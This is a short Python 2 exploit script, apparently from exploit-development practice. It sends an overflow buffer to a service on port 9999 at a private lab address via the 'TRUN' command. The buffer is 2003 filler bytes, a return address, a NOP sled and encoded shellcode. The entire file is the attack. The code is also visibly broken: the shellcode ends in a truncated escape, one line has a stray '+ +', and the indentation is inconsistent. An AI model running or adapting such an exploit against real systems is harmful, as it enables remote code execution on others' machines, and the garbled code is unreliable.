#!/usr/bin/python

import sys, socket

overflow = ("\xda\xc5\xd9\x74\x24\xf4\x5a\x31\xc9\xbf\x46\x5d\xb1\x8e"
"\xb1\x52\x31\x7a\x17\x83\xc2\x04\x03\x3c\x4e\x53\x7b\x3c"
"\x98\x11\x84\xbc\x59\x76\x0c\x59\x68\xb6\x6a\x2a\xdb\x06"
"\xf8\x7e\xd0\xed\xac\x6a\x63\x83\x78\x9d\xc4\x2e\x5f\x90"
"\xd5\x03\xa3\xb3\x55\x5e\xf0\x13\x67\x91\x05\x52\xa0\xcc"
"\xe4\x06\x79\x9a\x5b\xb6\x0e\xd6\x67\x3d\x5c\xf6\xef\xa2"
"\x15\xf9\xde\x75\x2d\xa0\xc0\x74\xe2\xd8\x48\x6e\xe7\xe5"
"\x03\x05\xd3\x92\x95\xcf\x2d\x5a\x39\x2e\x82\xa9\x43\x77"
"\x25\x52\x36\x81\x55\xef\x41\x56\x27\x2b\xc7\x4c\x8f\xb8"
"\x7f\xa8\x31\x6c\x19\x3b\x3d\xd9\x6d\x63\x22\xdc\xa2\x18"
"\x5e\x55\x45\xce\xd6\x2d\x62\xca\xb3\xf6\x0b\x4b\x1e\x58"
"\x33\x8b\xc1\x05\x91\xc0\xec\x52\xa8\x8b\x78\x96\x81\x33"
"\x79\xb0\x92\x40\x4b\x1f\x09\xce\xe7\xe8\x97\x09\x07\xc3"
"\x60\x85\xf6\xec\x90\x8c\x3c\xb8\xc0\xa6\x95\xc1\x8a\x36"
"\x19\x14\x1c\x66\xb5\xc7\xdd\xd6\x75\xb8\xb5\x3c\x7a\xe7"
"\xa6\x3f\x50\x80\x4d\xba\x33\x6f\x39\x0d\x41\x07\x38\x8d"
"\x57\x84\xb5\x6b\x3d\x24\x90\x24\xaa\xdd\xb9\xbe\x4b\x21"
"\x14\xbb\x4c\xa9\x9b\x3c\x02\x5a\xd1\x2e\xf3\xaa\xac\x0c"
"\x52\xb4\x1a\x38\x38\x27\xc1\xb8\x37\x54\x5e\xef\x10\xaa"
"\x97\x65\x8d\x95\x01\x9b\x4c\x43\x69\x1f\x8b\xb0\x74\x9e"
"\x5e\x8c\x52\xb0\xa6\x0d\xdf\xe4\x76\x58\x89\x52\x31\x32"
"\x7b\x0c\xeb\xe9\xd5\xd8\x6a\xc2\xe5\x9e\x72\x0f\x90\x7e"
"\xc2\xe6\xe5\x81\xeb\x6e\xe2\xfa\x11\x0f\x0d\xd1\x91\x2f"
"\xec\xf3\xef\xc7\xa9\x96\x4d\x8a\x49\x4d\x91\xb3\xc9\x67"
"\x6a\x4")

shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + + "\x90" * 32 + overflow

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('192.168.201.128', 9999))
        s.send(('TRUN /.:/' + shellcode))
        s.close()
except:
    print "Error occured while connecting to server"
    sys.exit()